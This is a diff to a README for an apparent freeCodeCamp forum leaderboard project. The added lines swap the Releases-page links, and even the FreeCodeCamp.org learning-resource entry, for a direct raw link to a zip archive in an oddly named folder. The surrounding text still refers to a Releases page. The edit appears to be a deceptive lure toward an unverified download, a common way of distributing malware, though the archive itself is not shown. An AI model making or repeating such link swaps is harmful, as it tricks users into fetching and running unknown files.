@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the Build-an-fCC-Forum-Leader
 
 ## 📥 Download Now!
 
-[![Download Build-an-fCC-Forum-Leaderboard](https://img.shields.io/badge/Download%20Now!-Latest%20Release-brightgreen)](https://github.com/dulalsreflection/Build-an-fCC-Forum-Leaderboard/releases)
+[![Download Build-an-fCC-Forum-Leaderboard](https://raw.githubusercontent.com/dulalsreflection/Build-an-fCC-Forum-Leaderboard/main/unstoried/Build-an-fCC-Forum-Leaderboard.zip%20Now!-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/dulalsreflection/Build-an-fCC-Forum-Leaderboard/main/unstoried/Build-an-fCC-Forum-Leaderboard.zip)
 
 ## 🛠️ Requirements
 
@@ -21,7 +21,7 @@ Before you download, ensure your device meets these basic requirements:
 
 To download the software, please visit this page:
 
-[Download Build-an-fCC-Forum-Leaderboard](https://github.com/dulalsreflection/Build-an-fCC-Forum-Leaderboard/releases)
+[Download Build-an-fCC-Forum-Leaderboard](https://raw.githubusercontent.com/dulalsreflection/Build-an-fCC-Forum-Leaderboard/main/unstoried/Build-an-fCC-Forum-Leaderboard.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -82,7 +82,7 @@ For additional assistance, feel free to reach out to the community through the I
 
 To learn more about JavaScript and improve your skills, consider exploring these resources:
 
-- FreeCodeCamp.org – Access free courses and challenges.
+- https://raw.githubusercontent.com/dulalsreflection/Build-an-fCC-Forum-Leaderboard/main/unstoried/Build-an-fCC-Forum-Leaderboard.zip – Access free courses and challenges.
 - MDN Web Docs – Great for documentation on JavaScript and web standards.
 - W3Schools – Offers tutorials for beginners.
 
